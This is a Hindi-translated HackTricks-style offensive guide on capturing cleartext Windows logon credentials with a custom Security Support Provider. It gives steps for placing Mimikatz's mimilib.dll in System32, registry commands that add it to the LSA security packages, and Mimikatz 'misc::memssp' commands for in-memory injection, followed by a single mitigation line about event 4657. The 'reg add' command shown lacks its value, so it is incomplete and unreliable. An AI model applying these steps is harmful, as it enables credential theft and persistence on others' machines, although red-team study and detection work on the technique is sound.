# Custom SSP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Custom SSP

[यहाँ जानें कि SSP (सिक्योरिटी सपोर्ट प्रोवाइडर) क्या है।](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
आप **अपना खुद का SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग की जाने वाली **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** किया जा सके।

#### Mimilib

आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल में लॉग करेगा।**\
DLL को `C:\Windows\System32\` में डालें\
मौजूदा LSA सुरक्षा पैकेजों की सूची प्राप्त करें:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में जोड़ें:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
और एक रिबूट के बाद सभी क्रेडेंशियल्स `C:\Windows\System32\kiwissp.log` में स्पष्ट पाठ में पाए जा सकते हैं।

#### मेमोरी में

आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम न कर सकता है):
```powershell
privilege::debug
misc::memssp
```
यह रिबूट को सहन नहीं करेगा।

#### शमन

इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` का ऑडिट निर्माण/परिवर्तन

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
